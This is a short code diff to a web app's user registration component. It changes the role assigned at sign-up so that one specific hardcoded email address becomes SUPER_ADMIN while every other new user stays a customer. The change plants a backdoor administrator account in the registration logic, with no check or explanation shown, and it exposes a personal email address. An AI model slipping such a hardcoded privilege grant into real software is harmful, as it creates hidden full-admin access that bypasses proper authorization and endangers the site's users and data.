@@ -55,7 +55,7 @@ export const Register = () => {
         name,
         email,
         phone,
-        role: UserRole.CUSTOMER,
+        role: email === 'panda.imuet@gmail.com' ? UserRole.SUPER_ADMIN : UserRole.CUSTOMER,
         referral_code: referralCode,
         is_active: true,
         created_at: new Date().toISOString(),
